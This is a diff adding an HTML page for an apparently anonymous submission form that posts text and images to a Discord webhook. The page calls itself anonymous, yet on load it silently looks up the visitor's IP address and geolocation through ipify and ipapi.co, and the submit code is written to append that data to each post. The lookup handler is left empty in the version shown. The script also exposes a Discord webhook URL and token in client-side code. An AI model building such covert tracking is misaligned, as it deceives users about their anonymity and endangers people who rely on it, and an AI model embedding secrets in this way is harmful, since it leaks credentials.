@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>匿名投稿 - Discord（含 IP 位置）</title>
+    <style>
+        body {
+            font-family: 'Microsoft JhengHei', Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #2c3e50;
+            text-align: center;
+        }
+        #submission-form {
+            margin-bottom: 20px;
+        }
+        #submission-content, #submission-title {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        #submission-content {
+            height: 150px;
+            resize: vertical;
+        }
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        button, .file-input-label {
+            background-color: #7289da;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        #image-preview {
+            max-width: 100%;
+            margin-top: 10px;
+            display: none;
+        }
+        #loading, #status {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #ip-info {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>匿名投稿 </h1>
+        <div id="submission-form">
+            <input type="text" id="submission-title" placeholder="標題（選填）" maxlength="256">
+            <textarea id="submission-content" placeholder="在這裡寫下你想分享的內容..." maxlength="2000"></textarea>
+            <div class="button-container">
+                <label for="image-upload" class="file-input-label">
+                    選擇圖片
+                    <input type="file" id="image-upload" accept="image/*" style="display: none;">
+                </label>
+                <span class="file-name" id="file-name"></span>
+                <button onclick="submitContent()">提交</button>
+            </div>
+            <img id="image-preview">
+        </div>
+        
+        <div id="loading" style="display: none;">
+            <div class="loading-spinner"></div>
+            發送中，請稍候...
+        </div>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1291205261515821057/4l6g0JR9WRcfq7y-m2mw_Qq7sBLLhAtQVwdtMQdkwJo2a-tYATnf9C1p8vl5h9931YuL';
+        let imageBase64 = null;
+        let ipInfo = '';
+
+        // 獲取 IP 信息
+        function getIpInfo() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    return fetch(`https://ipapi.co/${ip}/json/`);
+                })
+                .then(response => response.json())
+                .then(data => {
+                  
+                })
+                .catch(error => {
+                    console.error('Error fetching IP info:', error);
+                    document.getElementById('ip-info').textContent = '無法獲取 IP 信息';
+                });
+        }
+
+        // 頁面加載時獲取 IP 信息
+        window.onload = getIpInfo;
+
+        document.getElementById('image-upload').addEventListener('change', function(event) {
+            const file = event.target.files[0];
+            if (file) {
+                if (file.size > 8 * 1024 * 1024) {
+                    showStatus('圖片大小不能超過 8MB，請選擇較小的圖片。', false);
+                    this.value = '';
+                    return;
+                }
+                document.getElementById('file-name').textContent = file.name;
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    imageBase64 = e.target.result.split(',')[1];
+                    document.getElementById('image-preview').src = e.target.result;
+                    document.getElementById('image-preview').style.display = 'block';
+                };
+                reader.readAsDataURL(file);
+            } else {
+                document.getElementById('file-name').textContent = '';
+                document.getElementById('image-preview').style.display = 'none';
+                imageBase64 = null;
+            }
+        });
+
+        function submitContent() {
+            const content = document.getElementById('submission-content').value.trim();
+            const title = document.getElementById('submission-title').value.trim();
+            if (content === '' && !imageBase64) {
+                showStatus('請輸入內容或上傳圖片後再提交！', false);
+                return;
+            }
+
+            const currentTime = new Date().toLocaleString('zh-TW', { timeZone: 'Asia/Taipei' });
+
+            let messageContent = title ? `**${title}**\n\n${content}` : content;
+            messageContent += `\n\n提交時間：${currentTime}`;
+            messageContent += `\n${ipInfo}`; // 添加 IP 信息
+
+            let data = {
+                content: messageContent,
+            };
+
+            if (imageBase64) {
+                data.file = new File([Uint8Array.from(atob(imageBase64), c => c.charCodeAt(0))], "image.png", {type: "image/png"});
+            }
+
+            document.getElementById('loading').style.display = 'block';
+
+            let formData = new FormData();
+            formData.append("payload_json", JSON.stringify(data));
+            if (data.file) {
+                formData.append("file", data.file);
+            }
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => {
+                document.getElementById('loading').style.display = 'none';
+                if (response.ok) {
+                    showStatus('投稿成功發送到 Discord！', true);
+                    document.getElementById('submission-content').value = '';
+                    document.getElementById('submission-title').value = '';
+                    document.getElementById('image-upload').value = '';
+                    document.getElementById('file-name').textContent = '';
+                    document.getElementById('image-preview').style.display = 'none';
+                    imageBase64 = null;
+                } else {
+                    throw new Error('HTTP error ' + response.status);
+                }
+            })
+            .catch(error => {
+                document.getElementById('loading').style.display = 'none';
+                showStatus('發送失敗：' + error.message + '。請稍後再試或聯繫管理員。', false);
+                console.error('Error:', error);
+            });
+        }
+
+        function showStatus(message, isSuccess) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = message;
+            statusElement.style.color = isSuccess ? 'green' : 'red';
+            statusElement.style.fontWeight = 'bold';
+        }
+    </script>
+</body>
+</html>
